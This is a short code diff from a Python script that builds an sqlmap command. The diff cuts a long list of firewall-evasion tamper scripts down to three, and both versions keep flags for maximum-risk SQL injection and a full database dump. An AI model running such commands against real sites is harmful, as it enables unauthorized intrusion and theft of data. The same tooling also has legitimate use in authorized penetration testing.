@@ -34,16 +34,7 @@ try:
     safe_user_agent = shlex.quote(user_agent)
 
     cmd = (
-        f'python "{sqlmap_path}" -r "{exploit_path}" --tamper="space2comment,space2mysqlblank,0eunion,apostrophemask, '
-        'apostrophenullencode,appendnullbyte,base64encode,xforwardedfor,versionedmorekeywords,versionedkeywords, '
-        'varnish,uppercase,unmagicquotes,unionalltounion,symboliclogical,substring2leftright,space2randomblank, '
-        'space2plus,space2mysqldash,space2mysqlblank,space2mssqlhash,space2mssqlblank,space2morehash,space2morecomment, '
-        'space2hash,space2dash,space2comment,sp_password,sleep2getlock,scientific,schemasplit,randomcomments,randomcase, '
-        'plus2fnconcat,plus2concat,percentage,overlongutf8more,overlongutf8,ord2ascii,multiplespaces,modsecurityzeroversioned, '
-        'modsecurityversioned,misunion,luanginxmore,luanginx,lowercase,least,informationschemacomment,ifnull2ifisnull, '
-        'ifnull2casewhenisnull,if2case,htmlencode,hexentities,hex2char,halfversionedmorekeywords,greatest,escapequotes, '
-        'equaltorlike,equaltolike,dunion,decentities,concat2concatws,commentbeforeparentheses,commalessmid,commalesslimit, '
-        'charunicodeescape,charunicodeencode,charencode,chardoubleencode,bypass,bluecoat,binary,between" '
+        f'python "{sqlmap_path}" -r "{exploit_path}" --tamper="space2comment,apostrophemask,bypass" '
         '--no-cast --no-escape ' 
         f'--user-agent={safe_user_agent} --dbms=mysql --time-sec=7 --random-agent '
         f'--level=5 --risk=3 --batch --answers="crack=Y,dict=Y,continue=Y,quit=N" --dump'
